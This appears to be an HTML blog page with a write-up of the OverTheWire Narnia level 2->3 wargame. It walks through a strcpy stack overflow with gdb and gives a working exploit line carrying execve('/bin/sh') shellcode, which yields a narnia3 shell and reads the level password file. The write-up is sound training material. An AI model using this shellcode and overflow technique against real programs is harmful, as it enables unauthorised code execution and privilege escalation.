@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!">
+    <meta name="author" content="W3ndige">
+    <title>Overthewire.org - Narnia 2 -> 3 - Root Network Security</title>
+
+    <link rel="canonical" href="http://localhost:4000/2017/02/03/overthewire.org-narnia-3/">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/clean-blog.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//https://fonts.googleapis.com/css?family=Nunito:400,700i" rel="stylesheet">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Root Network Security" />
+
+</head>
+
+
+<body>
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Root Network Security</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="/about/">About</a>
+                </li>
+
+                <li>
+                    <a href="/archive/">Archive</a>
+                </li>
+
+                <li>
+                    <a href="/contact/">Contact</a>
+                </li>
+
+                <li>
+                    <a href="/projects/">Projects</a>
+                </li>
+
+                <li>
+                    <a href="/resources/">Resources</a>
+                </li>
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+
+    <!-- Post Header -->
+<header class="intro-header" style="background-image: url('/img/overthewire-header.png')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Overthewire.org - Narnia 2 -> 3</h1>
+                    
+                    <h2 class="subheading">Write-Up</h2>
+                    
+                    <span class="meta">Posted by W3ndige on February 3, 2017</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+				<h1>Introduction</h1>
+
+<p>What about another challenge in reverse engineering? Anywhere, anytime! </p>
+
+<h1>Challenge</h1>
+
+<p>As always, let's start from viewing the source code.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Usage: %s argument</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Okay, now let's run it. </p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">narnia2@melinda:/narnia$ ./narnia2
+Usage: ./narnia2 argument
+narnia2@melinda:/narnia$ ./narnia2 ARGUMENT
+ARGUMENTnarnia2@melinda:/narnia$</code></pre></figure>
+
+<p>As in the source code, we see that if argument is not passed, then usage instructions are printed, otherwise value of argument is printed on the next line. In addition, source code gives us information that char buf is 128 bytes in size. Let's try to trigger the segmentation fault. </p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">ARGUMENTnarnia2@melinda:/narnia$ ./narnia2 $(python -c "print 'A' * 140")
+Illegal instruction
+narnia2@melinda:/narnia$ ./narnia2 $(python -c "print 'A' * 141")
+Segmentation fault</code></pre></figure>
+
+<p>Hmm, that's interesting. After trying different amounts of A letters, I've noticed that by writing 140 of them, we will get <b>Illegal instruction</b> message, but 141 letters end up with our desired <b>Segmentation fault</b>. Maybe gdb will tell us something more? </p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">narnia2@melinda:/narnia$ gdb ./narnia2
+(gdb) break *main
+Breakpoint 1 at 0x804845d</code></pre></figure>
+
+<p>Firstly let's investigate the illegal instruction option. </p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run $(python -c "print 'A' * 140")
+Starting program: /games/narnia/narnia2 $(python -c "print 'A' * 140")
+
+Breakpoint 1, 0x0804845d in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGILL, Illegal instruction.
+0xf7e3ca00 in __libc_start_main () from /lib32/libc.so.6
+(gdb) c
+Continuing.
+
+Program terminated with signal SIGILL, Illegal instruction.
+The program no longer exists.</code></pre></figure>
+
+<p>Unfortunately after doing some research I've found out that SIGILL won't help us much. What we have to try is to overwrite the <b>instruction pointer. </b></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run $(python -c "print 'A' * 144")
+Starting program: /games/narnia/narnia2 $(python -c "print 'A' * 144")
+
+Breakpoint 1, 0x0804845d in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) c
+Continuing.
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.</code></pre></figure>
+
+<p>Luckily, adding only 3 more A's overwrote the pointer. But here comes another problem, what is its address? </p>
+<p>We can try to find out by writing around B's at the end. Let's see. </p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run $(python -c "print 'A' * 138 + 'B' * 6")
+Starting program: /games/narnia/narnia2 $(python -c "print 'A' * 138 + 'B' * 6")
+
+Breakpoint 1, 0x0804845d in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/200x $esp
+0xffffd7f0:	0x00000000	0x00000000	0xb7000000	0x9449f175
+0xffffd800:	0xb7857a44	0x6da4653e	0x69a15cf3	0x00363836
+0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
+0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
+0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8b0:	0x41414141	0x42424242	0x58004242	0x535f4744</code></pre></figure>
+
+<p>Great! EIP address is 0xffffd8b3. Now we have to find a way to use shellcode from previous challenge. But firstly, let's find its length. </p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">narnia2@melinda:/narnia$ python -c'print(len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"))'
+25</code></pre></figure>
+
+<p>25 bytes. As our string have to be 144 bytes in length, I'll firstly write 112 bytes of A letters, then 25 bytes of our shellcode and then overwrite the EIP with memory address somewhere in the middle of A's. Let's try it out! </p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run $(python -c "print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4")
+Starting program: /games/narnia/narnia2 $(python -c "print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4")
+
+(gdb) x/200x $esp
+0xffffd7f0:	0x00000000	0x00000000	0x4d000000	0x2bdc9c96
+0xffffd800:	0xd596f713	0x775b1954	0x6969a442	0x00363836
+0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
+0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
+0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd890:	0x41414141	0x41414141	0xc0314141	0x2f2f6850
+0xffffd8a0:	0x2f686873	0x896e6962	0x89c189e3	0xcd0bb0c2
+0xffffd8b0:	0x40c03180	0x424280cd	0x58004242	0x535f4744
+0xffffd8c0:	0x49535345	0x495f4e4f	0x30323d44	0x33323431
+0xffffd8d0:	0x45485300	0x2f3d4c4c	0x2f6e6962	0x68736162
+0xffffd8e0:	0x52455400	0x74783d4d	0x2d6d7265	0x63363532
+0xffffd8f0:	0x726f6c6f	0x48535300	0x494c435f	0x3d544e45
+0xffffd900:	0x362e3938	0x36312e34	0x3732312e	0x30333320
+0xffffd910:	0x32203434	0x53530032	0x54545f48	0x642f3d59
+0xffffd920:	0x702f7665	0x342f7374	0x434c0033	0x4c4c415f</code></pre></figure>
+
+<p>Great, we can see that even with the shellcode B's overwrote the EIP. Now let's try it with the actuall address - somewhere in the middle of the A letters. Maybe <b>0xffffd863</b>?</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">narnia2@melinda:/narnia$ ./narnia2 $(python -c "print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x63\xd8\xff\xff'")
+$ whoami
+narnia3
+$ cat /etc/narnia_pass/narnia3</code></pre></figure>
+
+<p>And we've got the password to the next level!</p>
+
+<h1>Conclusion</h1>
+<p>The challenge was awesome, but really time consuming. It was worth every minute as I learned a lot from trying out these different ways to finish this level. Thanks <a href="http://overthewire.org/wargames/">OverTheWire</a>!</p>
+
+<p>~ Stay safe!</p>
+
+
+                <hr>
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2017/02/02/overthewire.org-narnia-2/" data-toggle="tooltip" data-placement="top" title="Overthewire.org - Narnia 1 -> 2">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2017/02/07/enigma/" data-toggle="tooltip" data-placement="top" title="Enigma">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    <li>
+                        <a href="/feed.xml">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    <li>
+                        <a href="https://github.com/w3ndige">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a href="mailto:w3ndige@protonmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; RootNetSec 2016 - 2017</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/clean-blog.min.js "></script>
+
+
+</body>
+
+</html>
